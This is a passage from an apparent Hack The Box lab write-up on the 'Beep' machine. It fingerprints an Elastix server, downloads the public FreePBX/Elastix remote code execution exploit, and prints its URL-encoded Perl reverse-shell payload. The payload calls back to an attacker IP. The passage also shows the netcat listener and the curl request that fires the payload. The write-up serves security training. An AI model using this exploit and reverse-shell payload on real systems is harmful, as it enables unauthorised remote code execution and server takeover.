+</pre> </div> </div> <p><br> Run the same curl for the https.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4431"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4431')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4431')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4431')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4431')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4431">
+┌──(kali㉿kali)-[~]
+└─$ curl -I -k --tls-max 1.0 https://10.129.229.183
+HTTP/1.1 200 OK
+Date: Sat, 17 Jan 2026 05:06:29 GMT
+Server: Apache/2.2.3 (CentOS)
+X-Powered-By: PHP/5.1.6
+Set-Cookie: elastixSession=a66vo2p6103i7v02e5o0c0q1b0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4431" onclick="terminalOverlayClose('bash-bash-4431')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4431')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4431')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4431')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4431" data-language="bash">
+┌──(kali㉿kali)-[~]
+└─$ curl -I -k --tls-max 1.0 https://10.129.229.183
+HTTP/1.1 200 OK
+Date: Sat, 17 Jan 2026 05:06:29 GMT
+Server: Apache/2.2.3 (CentOS)
+X-Powered-By: PHP/5.1.6
+Set-Cookie: elastixSession=a66vo2p6103i7v02e5o0c0q1b0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8
+</pre> </div> </div> <p><br> Check the landing page for the server on port 443.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/beep/landingpage.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the source code for the landing page.</p> <div class="terminal" data-language="browser" id="terminal-view-source-https-10-129-229-183-browser-341787"> <div class="terminal__header terminal__header--browser"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('view-source-https-10-129-229-183-browser-341787')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('view-source-https-10-129-229-183-browser-341787')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('view-source-https-10-129-229-183-browser-341787')" title="Maximize"></button> </div> <span class="terminal__title">view-source:https://10.129.229.183</span> <button class="terminal__copy" onclick="terminalCopy('view-source-https-10-129-229-183-browser-341787')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-view-source-https-10-129-229-183-browser-341787">
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+  &lt;head&gt;
+	&lt;title&gt;Elastix - Login page&lt;/title&gt;
+	&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+	&lt;!--&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;--&gt;
+	&lt;link rel="stylesheet" href="themes/elastixneo/login_styles.css"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+	&lt;form method="POST"&gt;
+	  &lt;div id="neo-login-box"&gt;
+		&lt;div id="neo-login-logo"&gt;
+		  &lt;img src="themes/elastixneo/images/elastix_logo_mini.png" width="200" height="62" alt="elastix logo" /&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-login-line"&gt;
+		  &lt;div class="neo-login-label"&gt;Username:&lt;/div&gt;
+		  &lt;div class="neo-login-inputbox"&gt;&lt;input type="text" id="input_user" name="input_user" class="neo-login-input" /&gt;&lt;/div&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-login-line"&gt;
+		  &lt;div class="neo-login-label"&gt;Password:&lt;/div&gt;
+		  &lt;div class="neo-login-inputbox"&gt;&lt;input type="password" name="input_pass" class="neo-login-input" /&gt;&lt;/div&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-login-line"&gt;
+		  &lt;div class="neo-login-label"&gt;&lt;/div&gt;
+		  &lt;div class="neo-login-inputbox"&gt;&lt;input type="submit" name="submit_login" value="Submit" class="neo-login-submit" /&gt;&lt;/div&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-footernote"&gt;&lt;a href="http://www.elastix.org" style="text-decoration: none;" target='_blank'&gt;Elastix&lt;/a&gt; is licensed under &lt;a href="http://www.opensource.org/licenses/gpl-license.php" style="text-decoration: none;" target='_blank'&gt;GPL&lt;/a&gt; by &lt;a href="http://www.palosanto.com" style="text-decoration: none;" target='_blank'&gt;PaloSanto Solutions&lt;/a&gt;. 2006 - 2026.&lt;/div&gt;
+		&lt;br&gt;
+		&lt;script type="text/javascript"&gt;
+			document.getElementById("input_user").focus();
+		&lt;/script&gt;
+	  &lt;/div&gt;
+	&lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-view-source-https-10-129-229-183-browser-341787" onclick="terminalOverlayClose('view-source-https-10-129-229-183-browser-341787')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header terminal__header--browser"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('view-source-https-10-129-229-183-browser-341787')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('view-source-https-10-129-229-183-browser-341787')" title="Restore"></button> </div> <span class="terminal__title">view-source:https://10.129.229.183</span> <button class="terminal__copy" onclick="terminalCopyModal('view-source-https-10-129-229-183-browser-341787')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-view-source-https-10-129-229-183-browser-341787" data-language="browser">
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+  &lt;head&gt;
+	&lt;title&gt;Elastix - Login page&lt;/title&gt;
+	&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+	&lt;!--&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;--&gt;
+	&lt;link rel="stylesheet" href="themes/elastixneo/login_styles.css"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+	&lt;form method="POST"&gt;
+	  &lt;div id="neo-login-box"&gt;
+		&lt;div id="neo-login-logo"&gt;
+		  &lt;img src="themes/elastixneo/images/elastix_logo_mini.png" width="200" height="62" alt="elastix logo" /&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-login-line"&gt;
+		  &lt;div class="neo-login-label"&gt;Username:&lt;/div&gt;
+		  &lt;div class="neo-login-inputbox"&gt;&lt;input type="text" id="input_user" name="input_user" class="neo-login-input" /&gt;&lt;/div&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-login-line"&gt;
+		  &lt;div class="neo-login-label"&gt;Password:&lt;/div&gt;
+		  &lt;div class="neo-login-inputbox"&gt;&lt;input type="password" name="input_pass" class="neo-login-input" /&gt;&lt;/div&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-login-line"&gt;
+		  &lt;div class="neo-login-label"&gt;&lt;/div&gt;
+		  &lt;div class="neo-login-inputbox"&gt;&lt;input type="submit" name="submit_login" value="Submit" class="neo-login-submit" /&gt;&lt;/div&gt;
+		&lt;/div&gt;
+		&lt;div class="neo-footernote"&gt;&lt;a href="http://www.elastix.org" style="text-decoration: none;" target='_blank'&gt;Elastix&lt;/a&gt; is licensed under &lt;a href="http://www.opensource.org/licenses/gpl-license.php" style="text-decoration: none;" target='_blank'&gt;GPL&lt;/a&gt; by &lt;a href="http://www.palosanto.com" style="text-decoration: none;" target='_blank'&gt;PaloSanto Solutions&lt;/a&gt;. 2006 - 2026.&lt;/div&gt;
+		&lt;br&gt;
+		&lt;script type="text/javascript"&gt;
+			document.getElementById("input_user").focus();
+		&lt;/script&gt;
+	  &lt;/div&gt;
+	&lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</pre> </div> </div> <p><br> Check the exploit-db for Elastix and check what it has.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/beep/elastixexploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="elastixexploit" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/18650" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/18650</a></p> <p><br> Download the Elastix exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4782"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4782')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4782')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4782')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4782')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4782">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ wget https://www.exploit-db.com/raw/18650 -O exploit.py                                                          
+--2026-01-17 16:23:05--  https://www.exploit-db.com/raw/18650
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1908 (1.9K) [text/plain]
+Saving to: ‘exploit.py’
+
+exploit.py                                                 100%[========================================================================================================================================&gt;]   1.86K  --.-KB/s    in 0s      
+
+2026-01-17 16:23:06 (60.3 MB/s) - ‘exploit.py’ saved [1908/1908]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4782" onclick="terminalOverlayClose('bash-bash-4782')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4782')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4782')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4782')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4782" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ wget https://www.exploit-db.com/raw/18650 -O exploit.py                                                          
+--2026-01-17 16:23:05--  https://www.exploit-db.com/raw/18650
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1908 (1.9K) [text/plain]
+Saving to: ‘exploit.py’
+
+exploit.py                                                 100%[========================================================================================================================================&gt;]   1.86K  --.-KB/s    in 0s      
+
+2026-01-17 16:23:06 (60.3 MB/s) - ‘exploit.py’ saved [1908/1908]
+</pre> </div> </div> <p><br> Update the python script to output the url string.</p> <div class="terminal" data-language="python" id="terminal-exploit-py-python-101294"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('exploit-py-python-101294')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('exploit-py-python-101294')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('exploit-py-python-101294')" title="Maximize"></button> </div> <span class="terminal__title">exploit.py</span> <button class="terminal__copy" onclick="terminalCopy('exploit-py-python-101294')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-exploit-py-python-101294">
+#!/usr/bin/python
+############################################################
+# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
+# Google Dork: oy vey
+# Date: March 23rd, 2012
+# Author: muts, SSL update by Emporeo
+# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
+# Tested on: multiple
+# CVE : notyet
+# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
+# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
+############################################################
+# Discovered by Martin Tschirsich
+# http://seclists.org/fulldisclosure/2012/Mar/234
+# http://www.exploit-db.com/exploits/18649
+############################################################
+
+rhost="10.129.229.183"
+lhost="10.10.14.120"
+lport=443
+extension="1000"
+
+# Reverse shell payload
+
+url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&amp;callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+
+print(url)
+</pre> </div> <div class="terminal__overlay" id="overlay-exploit-py-python-101294" onclick="terminalOverlayClose('exploit-py-python-101294')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('exploit-py-python-101294')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('exploit-py-python-101294')" title="Restore"></button> </div> <span class="terminal__title">exploit.py</span> <button class="terminal__copy" onclick="terminalCopyModal('exploit-py-python-101294')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-exploit-py-python-101294" data-language="python">
+#!/usr/bin/python
+############################################################
+# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
+# Google Dork: oy vey
+# Date: March 23rd, 2012
+# Author: muts, SSL update by Emporeo
+# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
+# Tested on: multiple
+# CVE : notyet
+# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
+# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
+############################################################
+# Discovered by Martin Tschirsich
+# http://seclists.org/fulldisclosure/2012/Mar/234
+# http://www.exploit-db.com/exploits/18649
+############################################################
+
+rhost="10.129.229.183"
+lhost="10.10.14.120"
+lport=443
+extension="1000"
+
+# Reverse shell payload
+
+url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&amp;callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+
+print(url)
+</pre> </div> </div> <p><br> Start a netcat listener.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4115"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4115')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4115')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4115')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4115')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4115">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ sudo nc -nlvp 443
+[sudo] password for kali: 
+listening on [any] 443 ...
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4115" onclick="terminalOverlayClose('bash-bash-4115')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4115')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4115')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4115')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4115" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ sudo nc -nlvp 443
+[sudo] password for kali: 
+listening on [any] 443 ...
+</pre> </div> </div> <p><br> Run the exploit and note the payload.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4514"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4514')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4514')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4514')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4514')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4514">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ python3 exploit.py                                                                    
+https://10.129.229.183/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.120%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4514" onclick="terminalOverlayClose('bash-bash-4514')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4514')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4514')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4514')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4514" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ python3 exploit.py                                                                    
+https://10.129.229.183/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.120%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+</pre> </div> </div> <p><br> Try the url payload. Check the listener. Fail.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41726"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41726')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41726')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41726')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41726')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41726">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ curl -k --tls-max 1.0 https://10.129.229.183/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.120%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+[1] 2864
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ 
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+  &lt;head&gt;
+    &lt;TITLE&gt;Voicemail Message Call Me Control&lt;/TITLE&gt;
+    &lt;link rel="stylesheet" href="../theme/main.css" type="text/css"&gt;
+    &lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;
+  &lt;/head&gt;
+
+&lt;table class='voicemail' style='width: 100%; height: 100%; margin: 0 0 0 0; border: 0px; padding: 0px'&gt;&lt;tr&gt;&lt;td valign='middle' style='border: 0px'&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;script language='javascript'&gt;parent.document.getElementById('callme_status').innerHTML = 'The call failed.  Perhaps the line was busy.';&lt;/script&gt;&lt;script language='javascript'&gt;parent.document.getElementById('pb_load_inprogress').value='false';&lt;/script&gt;&lt;script language='javascript'&gt;parent.document.getElementById('callme_status').parentNode.style.backgroundColor = 'white';&lt;/script&gt;  &lt;/body&gt;
+&lt;/html&gt;
+
+
+[1]  + done       curl -k --tls-max 1.0 
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41726" onclick="terminalOverlayClose('bash-bash-41726')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41726')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41726')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41726')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 